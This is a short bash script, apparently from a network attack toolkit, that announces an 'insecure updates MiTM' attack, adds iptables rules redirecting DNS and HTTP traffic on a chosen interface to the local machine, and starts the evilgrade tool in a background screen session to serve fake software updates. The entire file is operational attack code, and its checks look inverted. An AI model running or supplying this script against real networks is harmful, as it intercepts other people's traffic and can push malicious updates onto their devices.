#!/bin/bash

echo '[*] running insecure updates MiTM attacks'

if iptables -t nat -vnL PREROUTING | grep "$1" | grep -q ' 53'; then
	iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-ports 53
fi
if iptables -t nat -vnL PREROUTING | grep "$1" | grep -q ' 80'; then
	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-ports 80
fi

screen -dmS evilgrade bash -c 'echo start | sudo evilgrade'
